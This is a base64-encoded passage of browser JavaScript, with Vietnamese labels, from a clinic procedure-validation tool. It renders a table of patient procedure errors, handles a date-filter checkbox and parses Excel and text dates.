iBjbGFzcz0iZXJyb3ItZGV0YWlsIj5LaMO0bmcgY8OzIGzhu5dpIG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvdGQ+PC90cj48L3Rib2R5PjwvdGFibGU+YDsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KLy8vLy8vLy9C4bqjbmcgbOG7jWMvLy8vLy8vLy8vLw0KICAgIGZpbHRlcmVkRXJyb3JzLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBpZiAoZXJyb3IuZGV0YWlscykgew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50TmFtZSB8fCAnS2jDtG5nIGPDsyd9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLmRldGFpbHMucGF0aWVudEFnZSB8fCAnMDAnfTwvZm9udD5dPGJyLz4gJHtlcnJvci5kZXRhaWxzLnBhdGllbnRJZCB8fCAnMDAwMDAwJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucHJvY2VkdXJlIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KCQkJCTx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+JHtlcnJvci5kZXRhaWxzLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLm9wZXJhdG9yID8gZXJyb3IuZGV0YWlscy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA6ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IuZGV0YWlscy5uZ2F5VGh1Y0hpZW4gfHwgKGVycm9yLmRldGFpbHMuZGF0ZSB8fCAnS2jDtG5nIGPDsycpfSA8YnIvPiR7DQogICAgICAgICAgICAgICAgICAgIGVycm9yLmRldGFpbHMuc3RhcnRUaW1lID8gYCR7ZXJyb3IuZGV0YWlscy5zdGFydFRpbWV9IC0gJHtlcnJvci5kZXRhaWxzLmVuZFRpbWV9YCA6ICdLaMO0bmcgY8OzJw0KICAgICAgICAgICAgICAgIH08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfQ0KICAgICAgICAgICAgICAgICAgIDxiPjxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZCA/IGAke2Vycm9yLmRldGFpbHMuYWN0dWFsfSBwaMO6dDwvZm9udD48L2I+IChU4buRaSB0aGnhu4N1OiAke2Vycm9yLmRldGFpbHMuZXhwZWN0ZWR9IHBow7p0KWAgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjUiIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9ICR7ZXJyb3Iucm93ID8gJyhEw7JuZyAnICsgZXJyb3Iucm93ICsgJyknIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfQ0KICAgIH0pOw0KDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCn0NCg0KDQoNCiAgICAgICAgZnVuY3Rpb24gbG9nRXJyb3IobWVzc2FnZSwgcm93ID0gbnVsbCwgZGV0YWlscyA9IG51bGwpIHsNCiAgICAgICAgICAgIGVycm9yTG9nLnB1c2goew0KICAgICAgICAgICAgICAgIG1lc3NhZ2UsDQogICAgICAgICAgICAgICAgcm93LA0KICAgICAgICAgICAgICAgIGRldGFpbHMsDQogICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvTG9jYWxlVGltZVN0cmluZygpLA0KICAgICAgICAgICAgICAgIHVzZXI6IGN1cnJlbnRVc2VyDQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KDQpmdW5jdGlvbiBkaXNwbGF5RXJyb3JzKCkgew0KICAgIGNvbnN0IGVycm9yTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yTG9nJyk7DQogICAgDQogICAgaWYgKGVycm9yTG9nLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyBs4buXaSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIA0KICAgICAgICAvLyBO4bq/dSBraMO0bmcgY8OzIGzhu5dpLCBjdeG7mW4geHXhu5FuZyBwaOG6p24gS+G6v3QgUXXhuqMgS2nhu4NtIFRyYQ0KICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgICAgIGNvbnN0IHJlc3VsdFNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpOw0KICAgICAgICAgICAgaWYgKHJlc3VsdFNlY3Rpb24gJiYgcmVzdWx0U2VjdGlvbi5zdHlsZS5kaXNwbGF5ICE9PSAnbm9uZScpIHsNCiAgICAgICAgICAgICAgICBzbW9vdGhTY3JvbGxUbyhyZXN1bHRTZWN0aW9uLCAtNDApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9LCAzMDApOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgLy8gSGnhu4NuIHRo4buLIHThu6tuZyBs4buXaQ0KICAgIGVycm9yTG9nLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBpZiAoZXJyb3IuZGV0YWlscykgew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50TmFtZSB8fCAnS2jDtG5nIGPDsyd9IFs8Zm9udCBjb2xvcj0icmVkIj4ke2Vycm9yLmRldGFpbHMucGF0aWVudEFnZSB8fCAnMDAnfTwvZm9udD5dPGJyLz4gJHtlcnJvci5kZXRhaWxzLnBhdGllbnRJZCB8fCAnMDAwMDAwJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucHJvY2VkdXJlIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+JHtlcnJvci5kZXRhaWxzLmRvY3RvciB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLm9wZXJhdG9yID8gZXJyb3IuZGV0YWlscy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA6ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IuZGV0YWlscy5uZ2F5VGh1Y0hpZW4gfHwgKGVycm9yLmRldGFpbHMuZGF0ZSB8fCAnS2jDtG5nIGPDsycpfSA8YnIvPiR7ZXJyb3IuZGV0YWlscy5zdGFydFRpbWUgPyBgJHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZX0gLSAke2Vycm9yLmRldGFpbHMuZW5kVGltZX1gIDogJ0tow7RuZyBjw7MnfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9DQogICAgICAgICAgICAgICAgICAgIDxiPjxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZCA/IGAke2Vycm9yLmRldGFpbHMuYWN0dWFsfSBwaMO6dDwvZm9udD48L2I+ICAgKFThu5FpIHRoaeG7g3U6ICR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZH0gcGjDunQpYCA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNiIgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0gJHtlcnJvci5yb3cgPyAnKETDsm5nICcgKyBlcnJvci5yb3cgKyAnKScgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCiAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBDdeG7mW4geHXhu5FuZyBwaOG6p24gbOG7l2kgbuG6v3UgY8OzDQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGNvbnN0IGVycm9yU2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKTsNCiAgICAgICAgaWYgKGVycm9yU2VjdGlvbikgew0KICAgICAgICAgICAgc21vb3RoU2Nyb2xsVG8oZXJyb3JTZWN0aW9uLCAtMTMwKTsNCiAgICAgICAgfQ0KICAgIH0sIDMwMCk7DQp9DQoNCi8vIEjDoG0gY3Xhu5luIG3GsOG7o3QgdOG7lW5nIHF1w6F0DQpmdW5jdGlvbiBzbW9vdGhTY3JvbGxUbyhlbGVtZW50LCBvZmZzZXQgPSAwKSB7DQogICAgZWxlbWVudC5jbGFzc0xpc3QuYWRkKCdoaWdobGlnaHQtZXJyb3Itc2VjdGlvbicpOw0KICAgIA0KICAgIGNvbnN0IGVsZW1lbnRQb3NpdGlvbiA9IGVsZW1lbnQuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCkudG9wOw0KICAgIGNvbnN0IG9mZnNldFBvc2l0aW9uID0gZWxlbWVudFBvc2l0aW9uICsgd2luZG93LnBhZ2VZT2Zmc2V0IC0gb2Zmc2V0Ow0KICAgIA0KICAgIGNvbnN0IGR1cmF0aW9uID0gMTUwMDsNCiAgICBjb25zdCBzdGFydCA9IHdpbmRvdy5wYWdlWU9mZnNldDsNCiAgICBjb25zdCBzdGFydFRpbWUgPSBwZXJmb3JtYW5jZS5ub3coKTsNCiAgICANCiAgICBmdW5jdGlvbiBzY3JvbGxTdGVwKHRpbWVzdGFtcCkgew0KICAgICAgICBjb25zdCBlbGFwc2VkID0gdGltZXN0YW1wIC0gc3RhcnRUaW1lOw0KICAgICAgICBjb25zdCBwcm9ncmVzcyA9IE1hdGgubWluKGVsYXBzZWQgLyBkdXJhdGlvbiwgMSk7DQogICAgICAgIGNvbnN0IGVhc2luZyA9IGVhc2VJbk91dEN1YmljKHByb2dyZXNzKTsNCiAgICAgICAgd2luZG93LnNjcm9sbFRvKDAsIHN0YXJ0ICsgKG9mZnNldFBvc2l0aW9uIC0gc3RhcnQpICogZWFzaW5nKTsNCiAgICAgICAgDQogICAgICAgIGlmIChwcm9ncmVzcyA8IDEpIHsNCiAgICAgICAgICAgIHdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUoc2Nyb2xsU3RlcCk7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgZnVuY3Rpb24gZWFzZUluT3V0Q3ViaWModCkgew0KICAgICAgICByZXR1cm4gdCA8IDAuNSA/IDQgKiB0ICogdCAqIHQgOiAxIC0gTWF0aC5wb3coLTIgKiB0ICsgMiwgMykgLyAyOw0KICAgIH0NCiAgICANCiAgICB3aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lKHNjcm9sbFN0ZXApOw0KICAgIA0KICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICBlbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2hpZ2hsaWdodC1lcnJvci1zZWN0aW9uJyk7DQogICAgfSwgMjAwMCk7DQp9DQoNCg0KIC8vID09PT09PSBC4bquVCBT4buwIEtJ4buGTiBDSEVDS0JPWCAiQ2jhu4kgaGnhu4NuIHRo4buLIG5nw6B5IHPhuq9jIHRodeG7kWMgbOG7l2kiID09PT09PQ0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dIZXJiRXJyb3JEYXlzQ2hlY2tib3gnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAgY29uc3Qgc2hvd09ubHlFcnJvckRheXMgPSB0aGlzLmNoZWNrZWQ7DQoNCiAgICAvLyAxLiBM4bqleSB0b8OgbiBi4buZIG5nw6B5IHThu6sgYWxsUHJvY2VkdXJlcw0KICAgIGNvbnN0IGFsbERhdGVzID0gWy4uLm5ldyBTZXQoYWxsUHJvY2VkdXJlcy5tYXAocCA9PiBwLmRhdGUpKV07DQoNCiAgICAvLyAyLiBO4bq/dSBi4bqtdCBjaGVja2JveCAtPiBjaOG7iSBnaeG7ryBuZ8OgeSBjw7Mgc+G6r2MgdGh14buRYyBs4buXaQ0KICAgIGxldCBkYXRlc1RvU2hvdyA9IGFsbERhdGVzOw0KICAgIGlmIChzaG93T25seUVycm9yRGF5cykgew0KICAgICAgICBjb25zdCBoZXJiRGF0ZXMgPSBuZXcgU2V0KCh3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgfHwgW10pLm1hcChoID0+IGguZGF0ZSkpOw0KICAgICAgICBkYXRlc1RvU2hvdyA9IGFsbERhdGVzLmZpbHRlcihkID0+IGhlcmJEYXRlcy5oYXMoZCkpOw0KICAgIH0NCg0KICAgIC8vIDMuIEPhuq1wIG5o4bqtdCBkcm9wZG93biBHaeG7nSB0cuG7kW5nIChmaWx0ZXJEYXRlKQ0KICAgIGNvbnN0IGZpbHRlckRhdGVTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsdGVyRGF0ZScpOw0KICAgIGlmIChmaWx0ZXJEYXRlU2VsZWN0KSB7DQogICAgICAgIGZpbHRlckRhdGVTZWxlY3QuaW5uZXJIVE1MID0gYDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPmAgKw0KICAgICAgICAgICAgZGF0ZXNUb1Nob3cubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICB9DQoNCiAgICAvLyA0LiBD4bqtcCBuaOG6rXQgZHJvcGRvd24gU+G6r2MgdGh14buRYyB0aGFuZyAoaGVyYkRhdGVGaWx0ZXIpDQogICAgY29uc3QgaGVyYkRhdGVTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYkRhdGVGaWx0ZXInKTsNCiAgICBpZiAoaGVyYkRhdGVTZWxlY3QpIHsNCiAgICAgICAgaGVyYkRhdGVTZWxlY3QuaW5uZXJIVE1MID0gYDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPmAgKw0KICAgICAgICAgICAgZGF0ZXNUb1Nob3cubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICB9DQp9KTsNCg0KDQogICAgICAgIGZ1bmN0aW9uIHBhcnNlRGF0ZVRpbWUoZGF0ZXRpbWVTdHIsIHJvd0luZGV4KSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIGlmICghZGF0ZXRpbWVTdHIpIHsNCiAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBkYXRldGltZVN0ciA9PT0gJ251bWJlcicpIHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgZXhjZWxEYXRlID0gbmV3IERhdGUoTWF0aC5yb3VuZCgoZGF0ZXRpbWVTdHIgLSAyNTU2OSkgKiA4NjQwMCAqIDEwMDApKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgZGF5ID0gZXhjZWxEYXRlLmdldERhdGUoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbW9udGggPSBleGNlbERhdGUuZ2V0TW9udGgoKSArIDE7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHllYXIgPSBleGNlbERhdGUuZ2V0RnVsbFllYXIoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgaG91cnMgPSBleGNlbERhdGUuZ2V0SG91cnMoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbWludXRlcyA9IGV4Y2VsRGF0ZS5nZXRNaW51dGVzKCk7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHNlY29uZHMgPSBleGNlbERhdGUuZ2V0U2Vjb25kcygpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVPYmo6IGV4Y2VsRGF0ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVLZXk6IGAke2RheX0vJHttb250aH0vJHt5ZWFyfWAsDQogICAgICAgICAgICAgICAgICAgICAgICBtaW51dGVzOiBob3VycyAqIDYwICsgbWludXRlcywNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHM6IGhvdXJzICogMzYwMCArIG1pbnV0ZXMgKiA2MCArIHNlY29uZHMsDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5VGltZTogYCR7aG91cnMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke21pbnV0ZXMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke3NlY29uZHMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfWANCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgZGF0ZXRpbWVTdHIgPT09ICdzdHJpbmcnKSB7DQogICAgICAgICAgICAgICAgICAgIGxldCBkYXRlUGFydCwgdGltZVBhcnQgPSAnMDA6MDA6MDAnOw0KICAgICAgICAgICAgICAgICAgICBpZiAoZGF0ZXRpbWVTdHIuaW5jbHVkZXMoJyAnKSkgW2RhdGVQYXJ0LCB0aW1lUGFydF0gPSBkYXRldGltZVN0ci5zcGxpdCgnICcpOw0KICAgICAgICAgICAgICAgICAgICBlbHNlIGRhdGVQYXJ0ID0gZGF0ZXRpbWVTdHI7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBsZXQgZGF5LCBtb250aCwgeWVhcjsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGVQYXJ0LmluY2x1ZGVzKCcvJykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBhcnRzID0gZGF0ZVBhcnQuc3BsaXQoJy8nKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJ0cy5sZW5ndGggPT09IDMpIFtkYXksIG1vbnRoLCB5ZWFyXSA9IHBhcnRzLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAocGFydHMubGVuZ3RoID09PSAyKSBbZGF5LCBtb250aF0gPSBwYXJ0cy5tYXAoTnVtYmVyKSwgeWVhciA9IG5ldyBEYXRlKCkuZ2V0RnVsbFllYXIoKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChkYXRlUGFydC5pbmNsdWRlcygnLScpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBwYXJ0cyA9IGRhdGVQYXJ0LnNwbGl0KCctJyk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFydHMubGVuZ3RoID09PSAzKSBbeWVhciwgbW9udGgsIGRheV0gPSBwYXJ0cy5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKHBhcnRzLmxlbmd0aCA9PT0gMikgW21vbnRoLCBkYXldID0gcGFydHMubWFwKE51bWJlciksIHllYXIgPSBuZXcgRGF0ZSgpLmdldEZ1bGxZZWFyKCk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB0aHJvdyBuZXcgRXJyb3IoJ8SQ4buLbmggZOG6oW5nIG5nw6B5IGtow7RuZyDEkcaw4bujYyBo4buXIHRy4bujJyk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoaXNOYU4oZGF5KSB8fCBpc05hTihtb250aCkgfHwgaXNOYU4oeWVhcikgfHwgZGF5IDwgMSB8fCBkYXkgPiAzMSB8fCBtb250aCA8IDEgfHwgbW9udGggPiAxMikgew0KICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdHacOhIHRy4buLIG5nw6B5IGtow7RuZyBo4bujcCBs4buHJyk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGxldCBob3VycyA9IDAsIG1pbnV0ZXMgPSAwLCBzZWNvbmRzID0gMDsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHRpbWVQYXJ0LmluY2x1ZGVzKCc6JykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHRpbWVQYXJ0cyA9IHRpbWVQYXJ0LnNwbGl0KCc6Jyk7DQogICAgICAgICAgICAgICAgICAgICAgICBob3VycyA9IHBhcnNlSW50KHRpbWVQYXJ0c1swXSkgfHwgMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIG1pbnV0ZXMgPSBwYXJzZUludCh0aW1lUGFydHNbMV0pIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICBzZWNvbmRzID0gcGFyc2VJbnQodGltZVBhcnRzWzJdKSB8fCAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNOYU4oaG91cnMpIHx8IGlzTmFOKG1pbnV0ZXMpIHx8IGlzTmFOKHNlY29uZHMpIHx8IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvdXJzIDwgMCB8fCBob3VycyA+IDIzIHx8IG1pbnV0ZXMgPCAwIHx8IG1pbnV0ZXMgPiA1OSB8fCBzZWNvbmRzIDwgMCB8fCBzZWNvbmRzID4gNTkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcignR2nDoSB0cuG7iyB0aOG7nWkgZ2lhbiBraMO0bmcgaOG7o3AgbOG7hycsIHJvd0luZGV4LCB7IHRpbWU6IHRpbWVQYXJ0IH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvdXJzID0gMDsgbWludXRlcyA9IDA7IHNlY29uZHMgPSAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXRlT2JqID0gbmV3IERhdGUoeWVhciwgbW9udGggLSAxLCBkYXksIGhvdXJzLCBtaW51dGVzLCBzZWNvbmRzKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGlzTmFOKGRhdGVPYmouZ2V0VGltZSgpKSkgdGhyb3cgbmV3IEVycm9yKCdOZ8OgeSBraMO0bmcgaOG7o3AgbOG7hycpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc2Vjb25kc0luRGF5ID0gaG91cnMgKiAzNjAwICsgbWludXRlcyAqIDYwICsgc2Vjb25kczsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgbWludXRlc0luRGF5ID0gaG91cnMgKiA2MCArIG1pbnV0ZXM7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gew0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZU9iaiwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGVLZXk6IGAke2RheX0vJHttb250aH0vJHt5ZWFyfWAsDQogICAgICAgICAgICAgICAgICAgICAgICBtaW51dGVzOiBtaW51dGVzSW5EYXksDQogICAgICAgICAgICAgICAgICAgICAgICBzZWNvbmRzOiBzZWNvbmRzSW5EYXksDQogICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5VGltZTogYCR7aG91cnMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke21pbnV0ZXMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfToke3NlY29uZHMudG9TdHJpbmcoKS5wYWRTdGFydCgyLCAnMCcpfWANCiAgICAgICAgICAgI